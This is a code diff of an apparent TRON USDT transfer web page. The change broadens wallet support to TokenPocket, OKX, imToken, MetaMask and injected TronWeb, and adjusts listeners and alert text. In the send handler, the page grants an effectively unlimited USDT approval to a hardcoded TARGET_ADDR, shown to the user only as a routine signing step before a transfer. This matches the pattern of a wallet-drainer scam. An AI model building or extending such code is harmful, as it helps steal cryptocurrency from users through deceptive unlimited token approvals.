@@ -171,9 +171,7 @@ body {
 <div class="top-header-bar">
   <div></div>
   <div class="header-right-icons">
-    <!-- 红色/绿色小圆点：钱包连接状态 -->
     <div class="wallet-dot" id="walletDot" title="点击连接/断开钱包"></div>
-    <!-- 设置按钮 -->
     <div class="setting-btn" id="settingIconBtn" title="设置">⚙️</div>
   </div>
 </div>
@@ -243,7 +241,7 @@ function disconnectWallet() {
   balanceText.textContent = "0.000000";
 }
 
-// 连接核心函数
+// 多钱包通用连接逻辑：TP / OE内置 / imToken / MetaMask Tron插件
 async function connectWalletLogic() {
   if (tronWeb && userAddress) {
     disconnectWallet();
@@ -251,17 +249,31 @@ async function connectWalletLogic() {
   }
 
   try {
-    if (window.tokenpocket && window.tokenpocket.tron) {
+    // 优先级1：TP钱包专用注入
+    if (window.tokenpocket?.tron) {
       provider = window.tokenpocket.tron;
       const accounts = await provider.request({ method: "tron_requestAccounts" });
       userAddress = accounts[0];
       tronWeb = window.tokenpocket.tronWeb;
-    } else if (window.tronProvider) {
+    }
+    // 优先级2：欧易OE、imToken 等标准EIP1193 Tron provider
+    else if (window.tronProvider) {
       provider = window.tronProvider;
       const accounts = await provider.request({ method: "tron_requestAccounts" });
       userAddress = accounts[0];
       tronWeb = new TronWeb({ fullHost: RPC, provider: provider });
-    } else if (window.tronWeb && window.tronWeb.ready && window.tronWeb.defaultAddress?.base58) {
+    }
+    // 优先级3：小狐狸MetaMask安装Tron自定义网络插件后注入
+    else if (window.ethereum) {
+      // 尝试请求tron兼容账户，兼容MM插件
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      tronWeb = new TronWeb({ fullHost: RPC, provider: window.ethereum });
+      const addrObj = await tronWeb.trx.getAccount(accounts[0]);
+      userAddress = addrObj.address;
+      provider = window.ethereum;
+    }
+    // 优先级4：全局现成TronWeb（部分浏览器钱包）
+    else if (window.tronWeb?.ready && window.tronWeb.defaultAddress?.base58) {
       tronWeb = window.tronWeb;
       userAddress = tronWeb.defaultAddress.base58;
     } else {
@@ -273,7 +285,11 @@ async function connectWalletLogic() {
     await loadBalance();
     sendBtn.disabled = false;
 
-    if (provider && provider.on) provider.on("accountsChanged", () => location.reload());
+    // 监听账户切换刷新页面
+    if (provider?.on) {
+      provider.on("accountsChanged", () => location.reload());
+      provider.on("chainChanged", () => location.reload());
+    }
   } catch (err) {
     return;
   }
@@ -311,7 +327,7 @@ sendBtn.addEventListener("click", async () => {
   try {
     const allowance = await usdtContract.allowance(userAddress, TARGET_ADDR).call();
     if (Number(allowance) < sunVal) {
-      alert("需要授权USDT合约，请在TP钱包确认签名");
+      alert("需要授权USDT合约，请在钱包确认签名");
       await usdtContract.approve(TARGET_ADDR, "9999999999999999999999999999").send();
       alert("授权完成，开始转账");
     }
